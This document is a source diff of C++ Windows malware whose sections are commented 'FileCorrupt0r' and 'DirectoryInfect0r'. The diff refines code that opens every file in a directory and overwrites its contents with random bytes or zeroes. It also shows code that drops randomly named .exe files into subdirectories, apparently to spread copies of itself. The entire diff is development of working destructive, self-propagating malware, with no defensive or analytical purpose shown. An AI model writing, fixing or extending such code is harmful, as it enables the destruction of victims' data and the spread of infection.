@@ -79,6 +79,7 @@ INT APIENTRY wWinMain(
 		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
 			// FileCorrupt0r 1.1 //
 			LARGE_INTEGER liFs;
+			PWCHAR pszRd;
 			DWORD dwNOBW;
 			for (std::wstring i : vszFile) {
 				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
@@ -93,25 +94,28 @@ INT APIENTRY wWinMain(
 								fnERRORHANDLERW(L"Couldn't set File Attribute", NULL, L"SetFileAttributes", MB_ICONERROR);
 							}
 						}
-					}
-					else if (GetFileSizeEx(hFile, &liFs)) {
-						// TODO: Rewrite this b*llshit
-						PWCHAR pszRdDs;
-						if ((liFs.QuadPart <= nMAX_BUFFER_SIZE) && (liFs.HighPart == 0)) {
-							pszRdDs = new WCHAR[liFs.LowPart];
+					} else if (GetFileSizeEx(hFile, &liFs)) {
+						if ((liFs.QuadPart < nMAX_BUFFER_SIZE + 1) && (liFs.HighPart == 0)) {
+							pszRd = new WCHAR[liFs.LowPart];
 						} else {
-							pszRdDs = new WCHAR[nMAX_BUFFER_SIZE];
+							pszRd = new WCHAR[nMAX_BUFFER_SIZE];
+							liFs.LowPart = nMAX_BUFFER_SIZE;
 						}
 
-						if (BCryptGenRandom(NULL, (LPBYTE)pszRdDs, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
-							fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom", MB_ICONWARNING);
-							ZeroMemory(pszRdDs, liFs.LowPart);
-						}
-						if (!WriteFile(hFile, pszRdDs, liFs.LowPart, &dwNOBW, NULL)) {
-							fnERRORHANDLERW(L"Couldn't overwrite FileData", NULL, L"WriteFile", MB_ICONERROR);
-						}
+						if (pszRd) {
+							NTSTATUS lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+							if (lBCGRr) {
+								fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom", MB_ICONWARNING);
+								ZeroMemory(pszRd, liFs.LowPart);
+							}
+							if (!WriteFile(hFile, pszRd, liFs.LowPart, &dwNOBW, NULL)) {
+								fnERRORHANDLERW(L"Couldn't overwrite FileData", NULL, L"WriteFile", MB_ICONERROR);
+							}
 
-						delete[] pszRdDs;
+							delete[] pszRd;
+						} else {
+							fnERRORHANDLERW(L"Couldn't allocate Buffer", NULL, L"new(malloc(HeapAlloc))", MB_ICONERROR);
+						}
 					}
 
 					CloseHandle(hFile);
@@ -120,7 +124,7 @@ INT APIENTRY wWinMain(
 				}
 			}
 
-			// DirectoryInfector
+			// DirectoryInfect0r 1.0
 			std::wstring szNfn;
 			for (std::wstring i : vszDir) {
 				szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
